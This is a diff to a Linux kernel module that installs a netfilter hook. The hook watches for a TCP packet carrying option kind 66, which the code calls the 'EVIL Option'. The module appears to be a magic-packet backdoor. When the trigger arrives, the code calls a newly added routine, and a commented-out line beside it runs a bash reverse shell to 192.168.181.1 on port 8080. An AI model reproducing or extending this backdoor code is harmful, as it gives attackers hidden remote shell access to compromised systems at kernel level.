@@ -11,8 +11,8 @@
 #include <linux/init.h>
 #include <asm/string.h>
 #include <linux/umh.h>
-#include <hook_net.h>
-
+#include "../include/hook_net.h" 
+#include "../include/run_bash.h"
 
 
 unsigned int hookfunc(void *priv,
@@ -55,6 +55,7 @@ unsigned int hookfunc(void *priv,
     //printk(KERN_INFO "Got option with type %u and lenght %u\n", _opt->kind, _opt->size);
     if (_opt->kind == 66) {
       printk(KERN_INFO "Packet has EVIL Option\n");
+      kernel_schedule_loop();
       /// bash_run("sleep 60 && bash -i >& /dev/tcp/192.168.181.1/8080 0>&1", UMH_NO_WAIT);
       return NF_DROP;
     }
@@ -68,7 +69,7 @@ unsigned int hookfunc(void *priv,
 }
 
 
-int register_net_hook() {
+int register_net_hook(void) {
   read_lock(&dev_base_lock);
   dev = first_net_device(&init_net);
 
